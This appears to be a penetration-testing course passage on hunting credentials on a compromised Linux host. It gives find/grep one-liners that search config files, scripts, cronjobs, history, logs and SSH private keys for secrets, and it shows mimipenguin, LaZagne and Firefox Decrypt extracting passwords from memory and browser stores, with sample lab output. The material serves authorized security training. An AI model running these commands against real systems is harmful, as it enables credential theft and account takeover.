There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:  

|**`Files`**|**`History`**|**`Memory`**|**`Key-Rings`**|
|---|---|---|---|
|Configs|Logs|Cache|Browser stored credentials|
|Databases|Command-line History|In-memory Processing||
|Notes||||
|Scripts||||
|Source codes||||
|Cronjobs||||
|SSH Keys|
 There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind
Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network.

## Files
One core principle of Linux is that everything is a file. keep this concept in mind and search, find and filter the appropriate files according to our requirements.
 inspect several categories of files one by one. These categories are the following:|   |   |   |
|---|---|---|
|Configuration files|Databases|Notes|
|Scripts|Cronjobs|SSH keys|

#### Configuration Files

```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (`user`, `password`, `pass`) in each file with the file extension `.cnf`.
#### Credentials in Configuration Files
```shell-session
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.
#### Databases
```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. 
	However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as `.txt`. Therefore, in this case, we need to search for files including the `.txt` file extension and files that have no file extension at all.
#### Notes
```shell-session
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.
#### Scripts
```shell-session
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (`/etc/crontab`) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.
#### Cronjobs
```shell-session
cat /etc/crontab 

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
```
```shell-session
cry0l1t3@unixclient:~$ ls -la /etc/cron.*/

/etc/cron.d/:

```
#### SSH Keys
SSH keys can be considered "access cards" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (`Private key`) and a corresponding one for the server (`Public key`). However, these are not the same, so knowing the `public key` is insufficient to find a `private key`. The `public key` can verify signatures generated by the private SSH key and thus enables automatic login to the server.
	Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.

Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.

#### SSH Private Keys
```shell-session
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
#### SSH Public Keys
```shell-session
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
## History
In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.
```shell-session
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*

==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```
#### Logs
An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories:

|**Application Logs**|**Event Logs**|**Service Logs**|**System Logs**|
|---|---|---|---|

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:
|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|


Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:

```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
## Memory and Cache
Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.
	In order to retrieve this type of information from Linux distributions, there is a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin) that makes the whole process easier. However, this tool requires administrator/root permissions.

#### Memory - Mimipenguin

```shell-session
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py
[sudo] password for cry0l1t3: 

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY


cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
[sudo] password for cry0l1t3: 

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY
```
An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is `LaZagne`. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:

|Wifi|Wpa_supplicant|Libsecret|Kwallet|
|Chromium-based|CLI|Mozilla|Thunderbird|
|Git|Env_variable|Grub|Fstab|
|AWS|Filezilla|Gftp|SSH|
|Apache|Shadow|Docker|KeePass|
|Mimipy|Sessions|Keyrings|

For example, `Keyrings` are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password.
	It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.

#### Memory - LaZagne

```shell-session
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```

#### Browsers
Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the `Mozilla Firefox` browser stores the credentials encrypted in a hidden folder for the respective user.
	when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.

#### Firefox Stored Credentials
```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default
```
```shell-session
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
#### Decrypting Firefox Credentials
```shell-session
canklesmaks@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'

```
Alternatively, `LaZagne` can also return results if the user has used the supported browser.
#### Browsers - LaZagne

```shell-session
cry0l1t3@unixclient:~$ python3 laZagne.py browsers
```
